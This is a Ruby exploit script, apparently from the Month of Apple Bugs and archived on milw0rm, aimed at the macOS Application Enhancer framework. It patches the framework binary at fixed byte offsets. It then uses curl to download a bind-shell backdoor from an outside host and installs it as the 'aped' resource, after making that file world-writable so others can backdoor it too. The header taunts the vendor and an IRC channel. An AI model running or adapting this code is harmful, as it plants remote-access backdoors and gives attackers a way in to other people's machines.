# !/usr/bin/ruby
# Exploit Of The Apes: A practical pwnage for Application (UN)Enhancer aka APU
# (c) 2006 LMH <lmh [at] info-pull.com> and Johnny Pwnerseed.
#
# This goes dedicated to #macdev. For the childish flaming and great brain lag.
#
# Lesson: Don't talk about stuff you have NFC about. And don't insult
# people. Once you do it, and get pwned, total lulz ensues ;o(
#
# MD5 (ApplicationEnhancer) = cf9bf1fa74f8298f09aedce38c72a7da
# at offset 27512   0x807d0014      ->  0x38600000
# at offset 115586  0x8b4614890424  ->  0x31c090890424
# 

require 'fileutils'

# Define offsets to opcodes to be patched
PATCH_INSTRUCTIONS =  [
                        [ 27512,  "\x38\x60\x00\x00"         ],
                        [ 115586, "\x31\xc0\x90\x89\x04\x24" ]
                      ]

BACKDOO_URL = "http://projects.info-pull.com/moab/bug-files/sample-back" # must be fat binary, sample bind shell
PATH_TO_APE = "/Library/Frameworks/ApplicationEnhancer.framework"
PATH_TO_APU = "/Library/Frameworks/ApplicationUnenhancer.framework"

path_to_bozo  = (ARGV[0] || File.join(PATH_TO_APE,"Versions/Current/ApplicationEnhancer"))

puts "++ Starting: #{PATH_TO_APE}"
puts "++ Back-up:  #{PATH_TO_APU}"
# Move the original framework to back-up, copy contents back, set permissions.
# To repair:
# rm -rf /Library/Frameworks/ApplicationEnhancer.framework
# mv /Library/Frameworks/ApplicationUnenhancer.framework \
# /Library/Frameworks/ApplicationEnhancer.framework
if File.exists?(PATH_TO_APE)
  unless File.exists?(PATH_TO_APU)
    FileUtils.mv(PATH_TO_APE, PATH_TO_APU)
    FileUtils.cp_r(PATH_TO_APU, PATH_TO_APE)
    system "chmod u+w #{File.join(PATH_TO_APE, "Versions/A/ApplicationEnhancer")}"
  end
end

# Patching poor Apu (we could just replace the binary, but this is cooler as the
# guys at Unsanity, LLC think they can dropriv and forget all about flawed code...).
bozo    = File.read(path_to_bozo)

puts "++ Patch: #{path_to_bozo}"
PATCH_INSTRUCTIONS.each do |patch|
  offset  = patch[0] # start offset
  bindata = patch[1] # patch bytes
  bcount  = 0

  puts "++ Patching stage: offset=#{offset} patch size=#{bindata.size}"
  bindata.split(//).each do |patch_byte|
    target_offset = offset + bcount
    printf "++ Patching byte at %x\n", target_offset
    bozo[target_offset] = patch_byte
    bcount += 1
  end
end

puts "++ Binary pwnage done. Writing patched data..."
u_bozo = File.new(File.join(PATH_TO_APE, "/Versions/A/ApplicationEnhancer"), "w")
u_bozo.write(bozo)
u_bozo.close
puts "++ Done (#{bozo.size} bytes). Planting backdoor aped binary..."

aped_path = File.join(PATH_TO_APE, "Resources/aped")
system "chmod a+rxw #{aped_path}" # let everyone backdoor it afterwards, be social and share!
system "curl #{BACKDOO_URL} -o #{aped_path}"
system "chmod a+x #{aped_path}"

puts "++ Finished."

# milw0rm.com [2007-01-08]
